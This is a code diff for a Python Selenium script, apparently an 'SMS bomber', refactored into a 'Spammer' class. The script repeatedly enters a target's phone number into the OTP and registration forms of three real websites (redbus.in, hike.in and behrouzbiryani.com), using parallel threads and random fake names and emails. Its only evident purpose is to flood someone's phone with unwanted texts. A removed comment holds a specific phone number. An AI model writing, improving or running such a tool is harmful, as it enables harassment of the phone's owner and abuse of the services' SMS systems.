@@ -2,63 +2,108 @@ from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 import os
 import time
-
+import random
+import string
 from threading import Thread
 
-chrome_options = Options()
-#chrome_options.add_argument("--headless")
 
-path = os.getcwd()+r"\chromedriver.exe"
+class Spammer:
 
-def redbus_blast(mobile_no, bomb_count, seconds):
+    chrome_options = Options()
+    path = os.getcwd() + r"\chromedriver.exe"
 
-    driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
-    driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")
+    def __init__(self, mobile, count, seconds, headless=False):
+        self.mobile_no = mobile
+        self.bomb_count = round(int(count))
+        self.delay = float(seconds)
+        if headless:
+            Spammer.chrome_options.add_argument("--headless")
 
-    for i in range(bomb_count):
-        mobile_input = driver.find_element_by_id("mobileNoInp")
-        mobile_input.clear()
-        mobile_input.send_keys(mobile_no)
+    def redbus_blast(self):
+        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
+        driver.get("https://www.redbus.in/account?pageName=Home&noReload=noReload")
 
-        element = driver.find_element_by_class_name("otpContainer")
-        driver.execute_script("arguments[0].click();", element)
+        i = 0
+        while i <= self.bomb_count:
+            mobile_input = driver.find_element_by_id("mobileNoInp")
+            mobile_input.clear()
+            mobile_input.send_keys(self.mobile_no)
 
-        element = driver.find_element_by_class_name("resendOtpContainer")
-        driver.execute_script("arguments[0].click();", element)
+            element = driver.find_element_by_class_name("otpContainer")
+            driver.execute_script("arguments[0].click();", element)
 
-        driver.refresh()
-        time.sleep(seconds)
-        print(i+1)
+            element = driver.find_element_by_class_name("resendOtpContainer")
+            driver.execute_script("arguments[0].click();", element)
 
-    driver.close()
+            driver.refresh()
+            i += 1
+            self.bomb_count -= 1
 
+            time.sleep(self.delay)
 
-def hike_blast(mobile_no, bomb_count, seconds):
+        print(i)
+        driver.close()
 
-    driver = webdriver.Chrome(executable_path=path, chrome_options=chrome_options)
-    driver.get("https://hike.in/")
+    def hike_blast(self):
+        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
+        driver.get("https://hike.in/")
 
-    for i in range(bomb_count):
-        mobile_input = driver.find_element_by_id("number-input")
-        mobile_input.clear()
-        mobile_input.send_keys(mobile_no)
+        i = 0
+        while i <= self.bomb_count:
+            mobile_input = driver.find_element_by_id("number-input")
+            mobile_input.clear()
+            mobile_input.send_keys(self.mobile_no)
 
-        element = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
-        driver.execute_script("arguments[0].click();", element)
+            button = driver.find_element_by_xpath("//div[@onclick='sendSMS(this)']")
+            driver.execute_script("arguments[0].click();", button)
 
-        driver.refresh()
-        print(i+1)
-        time.sleep(seconds)
+            driver.refresh()
+            i += 1
+            self.bomb_count -= 1
 
-    driver.close()
+            time.sleep(self.delay)
 
+        print(i)
+        driver.close()
 
-# 9940551328
+    def biryani_blast(self):
+        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
+        driver.get("https://www.behrouzbiryani.com/bb-login")
 
-seconds = float(input('Enter delay: '))
-mobile_no = input('Enter mobile number: ')
-bomb_count = int(input('Enter number of sms blasts: '))
-t1 = Thread(target=hike_blast, args=[mobile_no, round(bomb_count/2), seconds])
-t2 = Thread(target=redbus_blast, args=[mobile_no, round(bomb_count/2), seconds])
-t1.start()
-t2.start()
+        random_string = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
+        name = random_string
+        email = random_string + "@ggwp.xxx"
+
+        i = 0
+        while i <= self.bomb_count:
+            mobile_input = driver.find_element_by_id("mobileno")
+            mobile_input.clear()
+            mobile_input.send_keys(self.mobile_no)
+
+            name_input = driver.find_element_by_id("customer_name")
+            name_input.clear()
+            name_input.send_keys(name)
+
+            email_input = driver.find_element_by_id("email_id")
+            email_input.clear()
+            email_input.send_keys(email)
+
+            button = driver.find_element_by_id("send_otp_register")
+            driver.execute_script("arguments[0].click();", button)
+
+            driver.refresh()
+            i += 1
+            self.bomb_count -= 1
+
+            time.sleep(self.delay)
+
+        print(i)
+        driver.close()
+
+    def spam(self):
+        t1 = Thread(target=self.hike_blast, args=[])
+        t2 = Thread(target=self.redbus_blast, args=[])
+        t3 = Thread(target=self.biryani_blast, args=[])
+        t1.start()
+        t2.start()
+        t3.start()
